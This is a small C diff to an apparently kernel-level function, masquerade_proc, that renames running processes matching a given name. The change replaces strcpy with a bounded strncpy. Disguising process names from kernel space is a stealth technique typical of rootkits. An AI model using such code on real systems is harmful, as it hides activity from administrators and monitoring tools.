@@ -71,7 +71,9 @@ static void masquerade_proc(struct masq_proc *proc) {
     // iterate over all processes and masquerade name if possible
     for_each_process(task) {
         if (strcmp(task->comm, orig_name) == 0) {
-            strcpy(task->comm, new_name);
+            // use strncpy instead of strcpy to avoid overflow
+            strncpy(task->comm, new_name, TASK_COMM_LEN - 1);
+            task->comm[TASK_COMM_LEN - 1] = '\0';
         }
     }
 }
